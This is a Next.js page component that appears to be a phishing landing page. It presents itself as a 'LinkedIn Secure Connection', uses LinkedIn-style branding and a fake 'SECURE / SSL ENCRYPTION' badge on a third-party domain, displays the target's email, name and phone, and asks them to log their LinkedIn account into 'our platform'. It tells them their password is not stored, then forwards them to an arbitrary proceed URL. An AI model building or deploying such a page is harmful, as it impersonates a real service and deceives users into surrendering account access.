import { createClient } from "@supabase/supabase-js";
import { notFound } from "next/navigation";
import ProceedButton from "./ProceedButton";
import ExpiredRedirect from "./ExpiredRedirect";

export const dynamic = "force-dynamic";
export const revalidate = 0;
export const fetchCache = "force-no-store";

type PageProps = {
  params: Promise<{ token: string }>;
};

const BUCKET = "connect-links";

export default async function LinkPage({ params }: PageProps) {
  const { token } = await params;

  const supabaseAdmin = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!,
    { auth: { autoRefreshToken: false, persistSession: false } }
  );

  const { data: blob, error } = await supabaseAdmin.storage.from(BUCKET).download(`${token}.json`);
  if (error || !blob) notFound();

  let payload: { email: string; name: string; phone: string; proceed_url?: string; revoked_at?: string } | null = null;
  try {
    const text = await blob.text();
    const json = JSON.parse(text);
    payload = {
      email: String(json.email || ""),
      name: String(json.name || ""),
      phone: String(json.phone || ""),
      proceed_url: json?.proceed_url ? String(json.proceed_url) : "",
      revoked_at: json?.revoked_at ? String(json.revoked_at) : ""
    };
  } catch {
    payload = null;
  }

  if (!payload?.email || !payload?.name || !payload?.phone) notFound();
  const isRevoked = !!payload.revoked_at;

  if (isRevoked) {
    return (
      <main className="max-w-2xl mx-auto space-y-6 py-10">
        <div className="bg-white rounded-2xl border border-slate-200 p-6 space-y-4">
          <h1 className="text-xl font-bold text-slate-900">This Link is no longer active</h1>
          <ExpiredRedirect seconds={5} />
        </div>
      </main>
    );
  }

  return (
    <main className="max-w-2xl mx-auto space-y-6 py-10">
      <div className="bg-white rounded-2xl border border-slate-200 p-6 space-y-5">
        <div className="flex items-center justify-between gap-4 flex-wrap">
          <div className="flex items-center gap-3">
            <div className="h-12 w-12 rounded-xl bg-[#0A66C2] text-white flex items-center justify-center font-extrabold text-xl leading-none">
              in
            </div>
            <div className="leading-tight">
              <h1 className="text-xl font-bold text-slate-900">LinkedIn Secure Connection</h1>
              <div className="text-xs text-slate-500">influencercircle.net · build 2026-03-11-01</div>
            </div>
          </div>
          <div className="flex items-center gap-3 bg-slate-50 border border-slate-200 rounded-xl px-4 py-3">
            <div className="h-9 w-9 rounded-lg bg-white border border-slate-200 flex items-center justify-center">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="text-emerald-600">
                <path d="M12 2a6 6 0 0 0-6 6v4H5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-8a1 1 0 0 0-1-1h-1V8a6 6 0 0 0-6-6Zm4 10H8V8a4 4 0 1 1 8 0v4Z" fill="currentColor" />
              </svg>
            </div>
            <div className="leading-tight">
              <div className="text-xs font-bold text-slate-900">SECURE</div>
              <div className="text-[10px] font-semibold text-slate-600 tracking-wide">SSL ENCRYPTION</div>
            </div>
          </div>
        </div>

        <p className="text-slate-600">
          You will now enter a secure connection into our server so you can log your Linkedin directly into our platform.
          Your password is not stored or seen by anyone and stays directly on your linkedin account.
        </p>

        <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 text-sm space-y-2">
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-1">
            <div className="text-slate-500 font-semibold">Email:</div>
            <div className="sm:col-span-2 font-semibold text-slate-900 break-words">{payload.email}</div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-1">
            <div className="text-slate-500 font-semibold">Name:</div>
            <div className="sm:col-span-2 font-semibold text-slate-900 break-words">{payload.name}</div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-1">
            <div className="text-slate-500 font-semibold">Phone:</div>
            <div className="sm:col-span-2 font-semibold text-slate-900 break-words">{payload.phone}</div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-1">
            <div className="text-slate-500 font-semibold">Channel:</div>
            <div className="sm:col-span-2 font-semibold text-slate-900">LinkedIn</div>
          </div>
          <div className="pt-2 text-xs text-slate-600 italic">
            *If you are not this user do not click on proceed because it will not work.
          </div>
        </div>

        <ProceedButton token={token} proceedUrl={payload.proceed_url || ""} />
      </div>
    </main>
  );
}
